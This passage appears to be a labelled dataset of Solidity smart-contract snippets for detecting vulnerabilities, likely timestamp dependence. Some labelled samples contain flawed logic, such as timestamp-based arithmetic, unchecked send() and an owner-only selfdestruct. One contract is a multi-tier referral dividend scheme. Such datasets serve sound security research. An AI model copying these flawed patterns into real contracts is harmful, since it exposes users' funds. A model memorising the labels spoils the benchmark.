require(startTime > 0);    require(msg.value == REFERRAL_REGISTRATION_FEE);    _registerReferral(_code, msg.sender);    creditVault(MAIN_SCHEME, addressOfOwner, msg.value);  }  function giftCode (string _code, address _referral) public restricted {    _registerReferral(_code, _referral);  }  function withdraw () public {    Info storage info = infoOfAddress[msg.sender];    uint payout = withdrawVault(MAIN_SCHEME, msg.sender);    if (Utils.validCountryId(info.countryId)) {      payout = payout.add(withdrawVault(info.countryId, msg.sender));    }    if (payout > 0) {      info.withdrawn = info.withdrawn.add(payout);      msg.sender.transfer(payout);      emit Withdrew(msg.sender, payout);    }  }  function withdrawPot () public player {    require(startTime > 0);    require(block.timestamp > (endTime + 10 minutes));    require(!potWithdrawn);    require(totalPot > 0);    require(addressOfCaptain == msg.sender);    uint payout = totalPot;    totalPot = 0;    potWithdrawn = true;    addressOfCaptain.transfer(payout);    emit Won(msg.sender, payout);  }}
1<CODESPLIT>contract MoonInc {    mapping(address => uint256) public cookieProduction;    mapping(address => uint256) private lastCookieSaveTime;    function balanceOfUnclaimedCookie(address player) internal constant returns (uint256) {        uint256 lastSave = lastCookieSaveTime[player];        if (lastSave > 0 && lastSave < block.timestamp) {            return (cookieProduction[player] * lastSave);        }        return 0;    }}
0<CODESPLIT>contract DSTokenBase is ERC20, DSMath {    uint256                                            _supply;    mapping (address => uint256)                       _balances;    mapping (address => mapping (address => uint256))  _approvals;        function DSTokenBase(uint256 supply) {        _balances[msg.sender] = supply;        _supply = supply;    }        function totalSupply() constant returns (uint256) {        return _supply;    }    function balanceOf(address src) constant returns (uint256) {        return _balances[src];    }    function allowance(address src, address guy) constant returns (uint256) {        return _approvals[src][guy];    }        function transfer(address dst, uint wad) returns (bool) {        assert(_balances[msg.sender] >= wad);                _balances[msg.sender] = sub(_balances[msg.sender], wad);        _balances[dst] = add(_balances[dst], wad);                Transfer(msg.sender, dst, wad);                return true;    }        function transferFrom(address src, address dst, uint wad) returns (bool) {        assert(_balances[src] >= wad);        assert(_approvals[src][msg.sender] >= wad);                _approvals[src][msg.sender] = sub(_approvals[src][msg.sender], wad);        _balances[src] = sub(_balances[src], wad);        _balances[dst] = add(_balances[dst], wad);                Transfer(src, dst, wad);                return true;    }        function approve(address guy, uint256 wad) returns (bool) {        _approvals[msg.sender][guy] = wad;                Approval(msg.sender, guy, wad);                return true;    }}
0<CODESPLIT>contract WhiteList {        mapping (address => bool)   public  whiteList;        address  public  owner;        function WhiteList() public {        owner = msg.sender;        whiteList[owner] = true;    }        function addToWhiteList(address [] _addresses) public {        require(msg.sender == owner);                for (uint i = 0; i < _addresses.length; i++) {            whiteList[_addresses[i]] = true;        }    }        function removeFromWhiteList(address [] _addresses) public {        require (msg.sender == owner);        for (uint i = 0; i < _addresses.length; i++) {            whiteList[_addresses[i]] = false;        }    }}
0<CODESPLIT>contract DSToken is DSTokenBase(0), DSStop {    bytes32  public  symbol = "GENEOS";    uint256  public  decimals = 18;          WhiteList public wlcontract;    function DSToken(WhiteList wlc_) {        require(msg.sender == wlc_.owner());        wlcontract = wlc_;    }    function transfer(address dst, uint wad) stoppable note returns (bool) {        require(wlcontract.whiteList(msg.sender));        require(wlcontract.whiteList(dst));        return super.transfer(dst, wad);    }    function transferFrom(        address src, address dst, uint wad    ) stoppable note returns (bool) {        require(wlcontract.whiteList(src));        require(wlcontract.whiteList(dst));        return super.transferFrom(src, dst, wad);    }    function approve(address guy, uint wad) stoppable note returns (bool) {        require(wlcontract.whiteList(msg.sender));        require(wlcontract.whiteList(guy));        return super.approve(guy, wad);    }    function push(address dst, uint128 wad) returns (bool) {        return transfer(dst, wad);    }    function pull(address src, uint128 wad) returns (bool) {        return transferFrom(src, msg.sender, wad);    }    function mint(uint128 wad) auth stoppable note {        require(wlcontract.whiteList(msg.sender));        _balances[msg.sender] = add(_balances[msg.sender], wad);        _supply = add(_supply, wad);    }    function burn(uint128 wad) auth stoppable note {        require(wlcontract.whiteList(msg.sender));        _balances[msg.sender] = sub(_balances[msg.sender], wad);        _supply = sub(_supply, wad);    }         bytes32   public  name = "";        function setName(bytes32 name_) auth {        name = name_;    }}
1<CODESPLIT>contract GENEOSSale is DSAuth, DSExec, DSMath {    DSToken  public  GENEOS;                    uint128  public  totalSupply = 1000000000000000000000000000;              uint128  public  foundersAllocation = 100000000000000000000000000;        string   public  foundersKey = "Dev key";               uint     public  createLastDay = 200000000000000000000000000;            uint     public  createPerDay = 4000000000000000000000000;              uint     public  numberOfDays = 175;             uint     public  startTime;                      uint     public  finalWindowTime;                uint     public  finishTime;    address  public  foundersAddress = 0x37048f9C92a41fcE4535FDE3022B887b34D7eC0E;    mapping (uint => uint)                       public  dailyTotals;    mapping (uint => mapping (address => uint))  public  userBuys;    mapping (uint => mapping (address => bool))  public  claimed;    mapping (address => string)                  public  keys;    event LogBuy      (uint window, address user, uint amount);    event LogClaim    (uint window, address user, uint amount);    event LogRegister (address user, string key);    event LogCollect  (uint amount);    event LogFreeze   ();    function GENEOSSale(        uint     _startTime    ) {        startTime = _startTime;        finalWindowTime = startTime + (numberOfDays * 20 minutes);        finishTime = finalWindowTime + 5 hours;    }    function initialize(DSToken geneos) auth {        assert(address(GENEOS) == address(0));        assert(geneos.owner() == address(this));        assert(geneos.authority() == DSAuthority(0));        assert(geneos.totalSupply() == 0);        GENEOS = geneos;        GENEOS.mint(totalSupply);                 GENEOS.push(foundersAddress, foundersAllocation);        keys[foundersAddress] = foundersKey;        LogRegister(foundersAddress, foundersKey);    }    function time() constant returns (uint) {        return block.timestamp;    }    function today() constant returns (uint) {        return dayFor(time());    }              function dayFor(uint timestamp) constant returns (uint) {        if (timestamp < startTime) {            return 0;        }        if (timestamp >= startTime && timestamp < finalWindowTime) {            return sub(timestamp, startTime) / 5 minutes + 1;        }        if (timestamp >= finalWindowTime && timestamp < finishTime) {            return 176;        }        return 999;    }    function createOnDay(uint day) constant returns (uint) {        assert(day >= 1 && day <= 176);        return day == 176 ? createLastDay : createPerDay;    }                   function buyWithLimit(uint day, uint limit) payable {        assert(today() > 0 && today() <= numberOfDays + 1);        assert(msg.value >= 0.01 ether);        assert(day >= today());        assert(day <= numberOfDays + 1);        userBuys[day][msg.sender] += msg.value;        dailyTotals[day] += msg.value;        if (limit != 0) {            assert(dailyTotals[day] <= limit);        }        LogBuy(day, msg.sender, msg.value);    }    function buy() payable {       buyWithLimit(today(), 0);    }    function () payable {       buy();    }    function claim(uint day) {                assert(today() > day);        if (claimed[day][msg.sender] || dailyTotals[day] == 0) {            return;        }                                   var dailyTotal = cast(dailyTotals[day]);        var userTotal  = cast(userBuys[day][msg.sender]);        var price      = wdiv(cast(createOnDay(day)), dailyTotal);        var reward     = wmul(price, userTotal);        claimed[day][msg.sender] = true;        GENEOS.push(msg.sender, reward);        LogClaim(day, msg.sender, reward);    }    function claimAll() {        for (uint i = 0; i < today(); i++) {            claim(i);        }    }                   function register(string key) {        assert(today() <=  numberOfDays + 1);        assert(bytes(key).length <= 64);        keys[msg.sender] = key;        LogRegister(msg.sender, key);    }         function collect() auth {        assert(today() > 0);          exec(msg.sender, this.balance);        LogCollect(this.balance);    }         function freeze() {        assert(time() > finishTime);        GENEOS.stop();        LogFreeze();    }}
0<CODESPLIT>contract moduleTokenInterface{    uint256 public totalSupply;    function balanceOf(address _owner) public constant returns (uint256 balance);    function transfer(address _to, uint256 _value) public returns (bool success);    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);        function approve(address _spender, uint256 _value) public returns (bool success);    function allowance(address _owner, address _spender) public constant returns (uint256 remaining);        event Transfer(address indexed _from, address indexed _to, uint256 _value);    event Approval(address indexed a_owner, address indexed _spender, uint256 _value);    event OwnerChang(address indexed _old,address indexed _new,uint256 _coin_change);	event adminUsrChange(address usrAddr,address changeBy,bool isAdded);	event onAdminTransfer(address to,uint256 value);}
1<CODESPLIT>contract Paypite {  mapping(address => uint256) releaseTimes;  function isLocked(address _spender) public view returns (bool) {    if (releaseTimes[_spender] == 0 || releaseTimes[_spender] <= block.timestamp) {      return false;    }    return true;  }}
0<CODESPLIT>contract MATOU is StandardToken {  string public name    = "MATOU Token";  string public symbol  = "MTB";  uint8 public decimals = 18;  uint256 public constant INITIAL_SUPPLY = 1000000000;  event Burn(address indexed _from, uint256 _tokenDestroyed, uint256 _timestamp);  function MATOU() public {    totalSupply_ = INITIAL_SUPPLY * (10 ** uint256(decimals));    balances[msg.sender] = totalSupply_;  }  function burn(uint256 _burntAmount) public returns (bool success) {    require(balances[msg.sender] >= _burntAmount && _burntAmount > 0);    balances[msg.sender] = balances[msg.sender].sub(_burntAmount);    totalSupply_ = totalSupply_.sub(_burntAmount);    emit Transfer(address(this), 0x0, _burntAmount);    emit Burn(msg.sender, _burntAmount, block.timestamp);    return true;  }}
0<CODESPLIT>contract UvtToken is PausableToken {         uint256 public tokenDestroyed;         address public devTeam;    address public investor;    address public ecoBuilder;    event Burn(address indexed _from, uint256 _tokenDestroyed, uint256 _timestamp);         function initializeSomeAddress(address newDevTeam, address newInvestor, address newEcoBuilder) onlyOwner public {        require(newDevTeam != address(0) && newInvestor != address(0) && newEcoBuilder != address(0));        require(devTeam == 0x0 && investor == 0x0 && ecoBuilder == 0x0);        devTeam = newDevTeam;        investor = newInvestor;        ecoBuilder = newEcoBuilder;    }         function burn(uint256 _burntAmount) onlyOwner public returns (bool success) {        require(balances[msg.sender] >= _burntAmount && _burntAmount > 0);        balances[msg.sender] = balances[msg.sender].sub(_burntAmount);        totalSupply = totalSupply.sub(_burntAmount);        tokenDestroyed = tokenDestroyed.add(_burntAmount);        require(tokenDestroyed < 10000000000 * (10 ** (uint256(decimals))));        emit Transfer(address(this), 0x0, _burntAmount);        emit Burn(msg.sender, _burntAmount, block.timestamp);        return true;    }         string public name = "User Value Token";    string public symbol = "UVT";    string public version = '1.0.0';    uint8 public decimals = 18;         constructor() public{        totalSupply = 10000000000 * (10 ** (uint256(decimals)));        balances[msg.sender] = totalSupply;             }    function transfer(address _to, uint256 _value) public whenNotPaused returns (bool) {        if (devTeam != 0x0 && _to == devTeam)        {                         require(balances[_to].add(_value) <= totalSupply.div(5));        }        if (investor != 0x0 && _to == investor)        {                         require(balances[_to].add(_value) <= totalSupply.div(5));        }        if (ecoBuilder != 0x0 && _to == ecoBuilder)        {                         require(balances[_to].add(_value) <= totalSupply.div(5));        }        return super.transfer(_to, _value);    }}
1<CODESPLIT>contract Consulting {    address public engineer;    uint public updatedTime;         function payout() returns (bool _success) {        if(msg.sender == engineer ) {             engineer.send(this.balance / 2);             updatedTime = block.timestamp;             _success = true;        }    }}
1<CODESPLIT>contract Timestamped {	uint256 public ts = 0;	uint256 public plus = 0;	function getBlockTime() public view returns (uint256) {		if(ts > 0) {			return ts + plus;		} else {			return block.timestamp + plus; 		}	}}
0<CODESPLIT>contract PyramidofKhufu {              modifier onlyBagholders() {        require(myTokens() > 0);        _;    }             modifier onlyStronghands() {        require(myDividends(true) > 0);        _;    }                                                     modifier onlyAdministrator(){        require(msg.sender == owner);        _;    }        modifier limitBuy() {         if(limit && msg.value > 100 ether) {              if ((msg.value) < address(this).balance && (address(this).balance-(msg.value)) >= 200 ether) {                  limit = false;            }            else {                revert();              }        }        _;    }         event onTokenPurchase(        address indexed customerAddress,        uint256 incomingEthereum,        uint256 tokensMinted,        address indexed referredBy    );        event onTokenSell(        address indexed customerAddress,        uint256 tokensBurned,        uint256 ethereumEarned    );        event onReinvestment(        address indexed customerAddress,        uint256 ethereumReinvested,        uint256 tokensMinted    );        event onWithdraw(        address indexed customerAddress,        uint256 ethereumWithdrawn    );    event OnRedistribution (        uint256 amount,        uint256 timestamp    );             event Transfer(        address indexed from,        address indexed to,        uint256 tokens    );                 string public name = "PyramidofKhufu";    string public symbol = "PXK";    uint8 constant public decimals = 18;    uint8 constant internal dividendFee_ = 15;      uint256 constant internal tokenPriceInitial_ = 0.00000001 ether;    uint256 constant internal tokenPriceIncremental_ = 0.000000001 ether;    uint256 constant internal magnitude = 2**64;             uint256 public stakingRequirement = 10;                         mapping(address => uint256) internal tokenBalanceLedger_;    mapping(address => address) internal referralOf_;    mapping(address => uint256) internal referralBalance_;    mapping(address => int256) internal payoutsTo_;    mapping(address => bool) internal alreadyBought;    uint256 internal tokenSupply_ = 0;    uint256 internal profitPerShare_;    mapping(address => bool) internal whitelisted_;    bool internal whitelist_ = true;    bool internal limit = true;        address public owner;                  constructor()        public    {        owner = msg.sender;        whitelisted_[msg.sender] = true;        whitelist_ = true;    }                  function buy(address _referredBy)        public        payable        returns(uint256)    {        purchaseTokens(msg.value, _referredBy);    }             function()        payable        public    {        purchaseTokens(msg.value, 0x0);    }             function reinvest()        onlyStronghands()        public    {                 uint256 _dividends = myDividends(false);                           address _customerAddress = msg.sender;        payoutsTo_[_customerAddress] +=  (int256) (_dividends * magnitude);                         _dividends += referralBalance_[_customerAddress];        referralBalance_[_customerAddress] = 0;                         uint256 _tokens = purchaseTokens(_dividends, 0x0);                         emit onReinvestment(_customerAddress, _dividends, _tokens);    }             function exit()        public    {                 address _customerAddress = msg.sender;        uint256 _tokens = tokenBalanceLedger_[_customerAddress];        if(_tokens > 0) sell(_tokens);                         withdraw();    }         function withdraw()        onlyStronghands()        public    {                 address _customerAddress = msg.sender;        uint256 _dividends = myDividends(false);                           payoutsTo_[_customerAddress] +=  (int256) (_dividends * magnitude);                         _dividends += referralBalance_[_customerAddress];        referralBalance_[_customerAddress] = 0;                         _customerAddress.transfer(_dividends);                         emit onWithdraw(_customerAddress, _dividends);    }             function sell(uint256 _amountOfTokens)        onlyBagholders()        public    {                 address _customerAddress = msg.sender;                 require(_amountOfTokens <= tokenBalanceLedger_[_customerAddress]);        uint256 _tokens = _amountOfTokens;        uint256 _ethereum = tokensToEthereum_(_tokens);                uint256 _undividedDividends = SafeMath.div(_ethereum*dividendFee_, 100);          uint256 _referralBonus = SafeMath.div(_undividedDividends, 2);          uint256 _dividends = SafeMath.sub(_undividedDividends, _referralBonus);                 uint256 _taxedEthereum = SafeMath.sub(_ethereum, (_dividends));        address _referredBy = referralOf_[_customerAddress];                if(                         _referredBy != 0x0000000000000000000000000000000000000000 &&                         _referredBy != _customerAddress &&                                                  tokenBalanceLedger_[_referredBy] >= stakingRequirement        ){                         referralBalance_[_referredBy] = SafeMath.add(referralBalance_[_referredBy], (_referralBonus / 2));              address tier2 = referralOf_[_referredBy];            if (tier2 != 0x0000000000000000000000000000000000000000 && tokenBalanceLedger_[tier2] >= stakingRequirement) {                referralBalance_[tier2] = SafeMath.add(referralBalance_[tier2], (_referralBonus*30 / 100));                                   if (referralOf_[tier2] != 0x0000000000000000000000000000000000000000 && tokenBalanceLedger_[referralOf_[tier2]] >= stakingRequirement) {                    referralBalance_[referralOf_[tier2]] = SafeMath.add(referralBalance_[referralOf_[tier2]], (_referralBonus*20 / 100));                      }                else {                    _dividends = SafeMath.add(_dividends, (_referralBonus*20 / 100));                }            }            else {                _dividends = SafeMath.add(_dividends, (_referralBonus*30 / 100));            }                    } else {                                      _dividends = SafeMath.add(_dividends, _referralBonus);        }                 tokenSupply_ = SafeMath.sub(tokenSupply_, _tokens);        tokenBalanceLedger_[_customerAddress] = SafeMath.sub(tokenBalanceLedger_[_customerAddress], _tokens);                         int256 _updatedPayouts = (int256) (profitPerShare_ * _tokens + (_taxedEthereum * magnitude));        payoutsTo_[_customerAddress] -= _updatedPayouts;                                if (tokenSupply_ > 0) {                         profitPerShare_ = SafeMath.add(profitPerShare_, (_dividends * magnitude) / tokenSupply_);        }                         emit onTokenSell(_customerAddress, _tokens, _taxedEthereum);    }              function transfer(address _toAddress, uint256 _amountOfTokens)        onlyBagholders()        public        returns(bool)    {                 address _customerAddress = msg.sender;                         require(_amountOfTokens <= tokenBalanceLedger_[_customerAddress]);                         if(myDividends(true) > 0) withdraw();                 tokenBalanceLedger_[_customerAddress] = SafeMath.sub(tokenBalanceLedger_[_customerAddress], _amountOfTokens);        tokenBalanceLedger_[_toAddress] = SafeMath.add(tokenBalanceLedger_[_toAddress], _amountOfTokens);                         payoutsTo_[_customerAddress] -= (int256) (profitPerShare_ * _amountOfTokens);        payoutsTo_[_toAddress] += (int256) (profitPerShare_ * _amountOfTokens);                         emit Transfer(_customerAddress, _toAddress, _amountOfTokens);                         return true;           }         function redistribution()        external        payable    {                 uint256 ethereum = msg.value;                         profitPerShare_ = SafeMath.add(profitPerShare_, (ethereum * magnitude) / tokenSupply_);                         emit OnRedistribution(ethereum, block.timestamp);    }             function setAdministrator(address _newAdmin)        onlyAdministrator()        external    {        owner = _newAdmin;    }             function setStakingRequirement(uint256 _amountOfTokens)        onlyAdministrator()        public    {        stakingRequirement = _amountOfTokens;    }             function setName(string _name)        onlyAdministrator()        public    {        name = _name;    }             function setSymbol(string _symbol)        onlyAdministrator()        public    {        symbol = _symbol;    }                  function totalEthereumBalance()        public        view        returns(uint)    {        return address(this).balance;    }             function totalSupply()        public        view        returns(uint256)    {        return tokenSupply_;    }             function myTokens()        public        view        returns(uint256)    {        address _customerAddress = msg.sender;        return balanceOf(_customerAddress);    }              function myDividends(bool _includeReferralBonus)         public         view         returns(uint256)    {        address _customerAddress = msg.sender;        return _includeReferralBonus ? dividendsOf(_customerAddress) + referralBalance_[_customerAddress] : dividendsOf(_customerAddress) ;    }             function balanceOf(address _customerAddress)        view        public        returns(uint256)    {        return tokenBalanceLedger_[_customerAddress];    }             function dividendsOf(address _customerAddress)        view        public        returns(uint256)    {        return (uint256) ((int256)(profitPerShare_ * tokenBalanceLedger_[_customerAddress]) - payoutsTo_[_customerAddress]) / magnitude;    }             function sellPrice()         public         view         returns(uint256)    {                 if(tokenSupply_ == 0){            return tokenPriceInitial_ - tokenPriceIncremental_;        } else {            uint256 _ethereum = tokensToEthereum_(1e18);            uint256 _dividends = SafeMath.div(_ethereum, dividendFee_);            uint256 _taxedEthereum = SafeMath.sub(_ethereum, _dividends);            return _taxedEthereum;        }    }             function buyPrice()         public         view         returns(uint256)    {                 if(tokenSupply_ == 0){            return tokenPriceInitial_ + tokenPriceIncremental_;        } else {            uint256 _ethereum = tokensToEthereum_(1e18);            uint256 _dividends = SafeMath.div(_ethereum, dividendFee_);            uint256 _taxedEthereum = SafeMath.add(_ethereum, _dividends);            return _taxedEthereum;        }    }             function calculateTokensReceived(uint256 _ethereumToSpend)         public         view         returns(uint256)    {        uint256 _dividends = SafeMath.div(_ethereumToSpend, dividendFee_);        uint256 _taxedEthereum = SafeMath.sub(_ethereumToSpend, _dividends);        uint256 _amountOfTokens = ethereumToTokens_(_taxedEthereum);                return _amountOfTokens;    }             function calculateEthereumReceived(uint256 _tokensToSell)         public         view         returns(uint256)    {        require(_tokensToSell <= tokenSupply_);        uint256 _ethereum = tokensToEthereum_(_tokensToSell);        uint256 _dividends = SafeMath.div(_ethereum, dividendFee_);        uint256 _taxedEthereum = SafeMath.sub(_ethereum, _dividends);        return _taxedEthereum;    }        function disableWhitelist() onlyAdministrator() external {        whitelist_ = false;    }         function purchaseTokens(uint256 _incomingEthereum, address _referredBy)        limitBuy()        internal        returns(uint256)    {                                     if (whitelisted_[msg.sender] == false && whitelist_ == true) {             revert();        }                 address _customerAddress = msg.sender;        uint256 _undividedDividends = SafeMath.div(_incomingEthereum*dividendFee_, 100);             uint256 _referralBonus = SafeMath.div(_undividedDividends, 2);          uint256 _dividends = SafeMath.sub(_undividedDividends, _referralBonus);        uint256 _taxedEthereum = SafeMath.sub(_incomingEthereum, (_undividedDividends));        uint256 _amountOfTokens = ethereumToTokens_(_taxedEthereum);        uint256 _fee = _dividends * magnitude;                                            require(_amountOfTokens > 0 && (SafeMath.add(_amountOfTokens,tokenSupply_) > tokenSupply_));                         if(                         _referredBy != 0x0000000000000000000000000000000000000000 &&                         _referredBy != _customerAddress &&                                                  tokenBalanceLedger_[_referredBy] >= stakingRequirement &&            referralOf_[_customerAddress] == 0x0000000000000000000000000000000000000000 &&            alreadyBought[_customerAddress] == false        ){            referralOf_[_customerAddress] = _referredBy;                                     referralBalance_[_referredBy] = SafeMath.add(referralBalance_[_referredBy], (_referralBonus / 2));              address tier2 = referralOf_[_referredBy];            if (tier2 != 0x0000000000000000000000000000000000000000 && tokenBalanceLedger_[tier2] >= stakingRequirement) {                referralBalance_[tier2] = SafeMath.add(referralBalance_[tier2], (_referralBonus*30 / 100));                                   if (referralOf_[tier2] != 0x0000000000000000000000000000000000000000 && tokenBalanceLedger_[referralOf_[tier2]] >= stakingRequirement) {                    referralBalance_[referralOf_[tier2]] = SafeMath.add(referralBalance_[referralOf_[tier2]], (_referralBonus*20 / 100));                      }                else {                    _dividends = SafeMath.add(_dividends, (_referralBonus*20 / 100));                    _fee = _dividends * magnitude;                }            }            else {                _dividends = SafeMath.add(_dividends, (_referralBonus*30 / 100));                _fee = _dividends * magnitude;            }                    } else {                                      _dividends = SafeMath.add(_dividends, _referralBonus);            _fee = _dividends * magnitude;        }                         if(tokenSupply_ > 0){                                     tokenSupply_ = SafeMath.add(tokenSupply_, _amountOfTokens);                          profitPerShare_ += (_dividends * magnitude / (tokenSupply_));                                     _fee = _fee - (_fee-(_amountOfTokens * (_dividends * magnitude / (tokenSupply_))));                } else {                         tokenSupply_ = _amountOfTokens;        }                         tokenBalanceLedger_[_customerAddress] = SafeMath.add(tokenBalanceLedger_[_customerAddress], _amountOfTokens);                                  int256 _updatedPayouts = (int256) ((profitPerShare_ * _amountOfTokens) - _fee);        payoutsTo_[_customerAddress] += _updatedPayouts;        alreadyBought[_customerAddress] = true;                 emit onTokenPurchase(_customerAddress, _incomingEthereum, _amountOfTokens, _referredBy);                return _amountOfTokens;    }         function ethereumToTokens_(uint256 _ethereum)        internal        view        returns(uint256)    {        uint256 _tokenPriceInitial = tokenPriceInitial_ * 1e18;        uint256 _tokensReceived =          (            (                                 SafeMath.sub(                    (sqrt                        (                            (_tokenPriceInitial**2)                            +                            (2*(tokenPriceIncremental_ * 1e18)*(_ethereum * 1e18))                            +                            (((tokenPriceIncremental_)**2)*(tokenSupply_**2))                            +                            (2*(tokenPriceIncremental_)*_tokenPriceInitial*tokenSupply_)                        )                    ), _tokenPriceInitial                )            )/(tokenPriceIncremental_)        )-(tokenSupply_)        ;          return _tokensReceived;    }             function tokensToEthereum_(uint256 _tokens)        internal        view        returns(uint256)    {        uint256 tokens_ = (_tokens + 1e18);        uint256 _tokenSupply = (tokenSupply_ + 1e18);        uint256 _etherReceived =        (                         SafeMath.sub(                (                    (                        (                            tokenPriceInitial_ +(tokenPriceIncremental_ * (_tokenSupply/1e18))                        )-tokenPriceIncremental_                    )*(tokens_ - 1e18)                ),(tokenPriceIncremental_*((tokens_**2-tokens_)/1e18))/2            )        /1e18);        return _etherReceived;    }                      function sqrt(uint x) internal pure returns (uint y) {        uint z = (x + 1) / 2;        y = x;        while (z < y) {            y = z;            z = (x / z + z) / 2;        }    }} library SafeMath {         function mul(uint256 a, uint256 b) internal pure returns (uint256) {        if (a == 0) {            return 0;        }        uint256 c = a * b;        assert(c / a == b);        return c;    }         function div(uint256 a, uint256 b) internal pure returns (uint256) {                 uint256 c = a / b;                 return c;    }         function sub(uint256 a, uint256 b) internal pure returns (uint256) {        assert(b <= a);        return a - b;    }         function add(uint256 a, uint256 b) internal pure returns (uint256) {        uint256 c = a + b;        assert(c >= a);        return c;    }}
0<CODESPLIT>contract ExtendedPrivateSale is TokenlessCrowdsale, WhitelistedAICrowdsale, FiatCappedCrowdsale, PausableCrowdsale {  using SafeMath for uint256;     RestrictedToken public tokenR0;    RestrictedToken public tokenR6;    uint8 constant bonusPct = 30;  constructor (address _wallet, uint256 _millWeiRate) TokenlessCrowdsale(_wallet)    FiatCappedCrowdsale(      2000000 * (10 ** 3),        10000 * (10 ** 3),        (10 ** 18) / 50,        _millWeiRate    )  public {    tokenR0 = new RestrictedToken(      2 * 40000000 * (10 ** 18),        'Sparrow Token (Restricted)',        'SPX-R0',        18,        0,        msg.sender,        this      );         tokenR6 = new RestrictedToken(      2 * 52000000 * (10 ** 18),        'Sparrow Token (Restricted with 6-month vesting)',        'SPX-R6',        18,        6 * 30 * 86400,        msg.sender,        this      );  }        function _processPurchaseInWei(address _beneficiary, uint256 _weiAmount) internal {    super._processPurchaseInWei(_beneficiary, _weiAmount);    uint256 tokens = _toLeconte(_weiAmount);    uint256 bonus = tokens.mul(bonusPct).div(100);         if (accredited[_beneficiary]) {      tokenR0.issue(_beneficiary, tokens);      tokenR6.issue(_beneficiary, bonus);    } else {      tokenR6.issue(_beneficiary, tokens.add(bonus));    }  }}
1<CODESPLIT>contract VRCoinCrowdsale {    struct Period {         uint end;         uint priceInWei;    }    Period public sale;    function getTokensForContribution(uint weiContribution) public constant returns(uint tokenAmount, uint weiRemainder) {         uint crowdsaleEnd = sale.end;         require(block.timestamp <= crowdsaleEnd);         uint periodPriceInWei = sale.priceInWei;         tokenAmount = weiContribution / periodPriceInWei;         weiRemainder = weiContribution % periodPriceInWei;         return (tokenAmount, weiRemainder);    }}
1<CODESPLIT>contract DWBTICO {    uint8[4] public weekBonuses;    uint startAt;    function getWeekNumber() internal view returns (uint8 weekNumber) {        weekNumber = 0;        uint time = startAt;        for (uint8 i = 1; i < weekBonuses.length; i++) {            time = time + 1 weeks;            if (block.timestamp <= time) {                break;            }        }        return;    }}
1<CODESPLIT>contract DQCoin is ERC20 {    using SafeMath for uint256;    address public owner;    mapping (address => uint256) balances;    mapping (address => mapping (address => uint256)) allowed;    string public name = "DaQianCoin";    string public constant symbol = "DQC";    uint public constant decimals = 18;    bool public stopped;        modifier stoppable {        assert(!stopped);        _;    }        uint256 public totalSupply = 24000000000*(10**18);    event Transfer(address indexed _from, address indexed _to, uint256 _value);    event Approval(address indexed _owner, address indexed _spender, uint256 _value);    event LOCK(address indexed _owner, uint256 _value);    mapping (address => uint256) public lockAddress;        modifier lock(address _add){        require(_add != address(0));        uint256 releaseTime = lockAddress[_add];        if(releaseTime > 0){             require(block.timestamp >= releaseTime);              _;        }else{             _;        }    }        modifier onlyOwner() {        require(msg.sender == owner);        _;    }        function DQCoin() public {        owner = msg.sender;        balances[msg.sender] = totalSupply;    }    function stop() onlyOwner public {        stopped = true;    }    function start() onlyOwner public {        stopped = false;    }        function lockTime(address _to,uint256 _value) onlyOwner public {       if(_value > block.timestamp){         lockAddress[_to] = _value;         emit LOCK(_to, _value);       }    }        function lockOf(address _owner) constant public returns (uint256) {	    return lockAddress[_owner];    }        function transferOwnership(address _newOwner) onlyOwner public {        if (_newOwner != address(0)) {            owner = _newOwner;        }    }        function () public payable {        address myAddress = this;        emit Transfer(msg.sender, myAddress, msg.value);     }    function balanceOf(address _owner) constant public returns (uint256) {	    return balances[_owner];    }        function transfer(address _to, uint256 _amount) stoppable lock(msg.sender) public returns (bool success) {        require(_to != address(0));        require(_amount <= balances[msg.sender]);                balances[msg.sender] = balances[msg.sender].sub(_amount);        balances[_to] = balances[_to].add(_amount);        emit Transfer(msg.sender, _to, _amount);        return true;    }        function transferFrom(address _from, uint256 _amount) stoppable lock(_from) public returns (bool success) {        require(_amount <= balances[_from]);        require(_amount <= allowed[_from][msg.sender]);                balances[_from] = balances[_from].sub(_amount);        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_amount);        balances[msg.sender] = balances[msg.sender].add(_amount);        emit Transfer(_from, msg.sender, _amount);        return true;    }        function approve(address _spender, uint256 _value) stoppable lock(_spender) public returns (bool success) {        if (_value != 0 && allowed[msg.sender][_spender] != 0) { return false; }        allowed[msg.sender][_spender] = _value;        emit Approval(msg.sender, _spender, _value);        return true;    }        function allowance(address _owner, address _spender)  constant public returns (uint256) {        return allowed[_owner][_spender];    }        function withdraw() onlyOwner public {        address myAddress = this;        uint256 etherBalance = myAddress.balance;        owner.transfer(etherBalance);    }        function kill() onlyOwner public {       selfdestruct(msg.sender);    }        function setName(string _name) onlyOwner public  {        name = _name;    }}
0<CODESPLIT>contract BrokenContract is Pausable {         address public newContractAddress;         function setNewAddress(address _v2Address) external onlyOwner whenPaused {                 owner.transfer(address(this).balance);        newContractAddress = _v2Address;    }} 
0<CODESPLIT>contract ERC721Enumerable is ERC721Basic {    function totalSupply() public view returns (uint256);    function tokenOfOwnerByIndex(address _owner, uint256 _index) public view returns (uint256 _tokenId);    function tokenByIndex(uint256 _index) public view returns (uint256);} 
0<CODESPLIT>contract ERC721Metadata is ERC721Basic {    function name() public view returns (string _name);    function symbol() public view returns (string _symbol);} 
0<CODESPLIT>contract ERC721BasicToken is BrokenContract, ERC721Basic {    using SafeMath for uint256;    using AddressUtils for address;         mapping (uint256 => address) internal tokenOwner;                   mapping (address => uint256) internal ownedTokensCount;         modifier onlyOwnerOf(uint256 _tokenId) {        require(ownerOf(_tokenId) == msg.sender);        _;    }                   function balanceOf(address _owner) public view returns (uint256) {        require(_owner != address(0));        return ownedTokensCount[_owner];    }         function ownerOf(uint256 _tokenId) public view returns (address) {        address owner = tokenOwner[_tokenId];        require(owner != address(0));        return owner;    }         function exists(uint256 _tokenId) public view returns (bool) {        address owner = tokenOwner[_tokenId];        return owner != address(0);    }                                       function isApprovedOrOwner(address _spender, uint256 _tokenId) internal view returns (bool) {        address owner = ownerOf(_tokenId);        return _spender == owner ;    }         function _mint(address _to, uint256 _tokenId) internal {        require(_to != address(0));        addTokenTo(_to, _tokenId);        emit Transfer(address(0), _to, _tokenId);    }                   function addTokenTo(address _to, uint256 _tokenId) internal {        require(tokenOwner[_tokenId] == address(0));        tokenOwner[_tokenId] = _to;        ownedTokensCount[_to] = ownedTokensCount[_to].add(1);    }         function removeTokenFrom(address _from, uint256 _tokenId) internal {        require(ownerOf(_tokenId) == _from);        ownedTokensCount[_from] = ownedTokensCount[_from].sub(1);        tokenOwner[_tokenId] = address(0);    }} 
